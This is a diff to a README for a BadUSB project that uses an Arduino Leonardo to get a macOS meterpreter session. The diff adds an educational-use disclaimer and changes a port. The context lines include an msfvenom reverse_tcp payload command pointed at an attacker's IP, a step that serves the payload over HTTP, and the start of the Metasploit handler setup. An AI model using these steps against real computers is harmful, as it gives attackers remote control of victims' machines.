@@ -1,5 +1,7 @@
 # Description
 A simple sketch for handle MacOS meterpreter session using an Arduino Leonardo (atmega32u4)
+# Disclaimer
+This sketch was created only for educational purposes. This script shows the danger of leaving your computer unlocked. The author respects the rights and freedom of each person and is not responsible for your actions.
 # Demonstration
 MacOS desktop:
 ![](https://github.com/cucurucuq/arduino_leonardo_macos_meterpreter/blob/main/badusb_macos.gif)
@@ -15,7 +17,7 @@ $ msfvenom payload python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080
 2. Run simple HTTP server 
 ```
 $ cd /var/www/html/
-$ python3 -m http.server 8080
+$ python3 -m http.server 8081
 ```
 3. Open Metasploit and start multi-handler
 ```
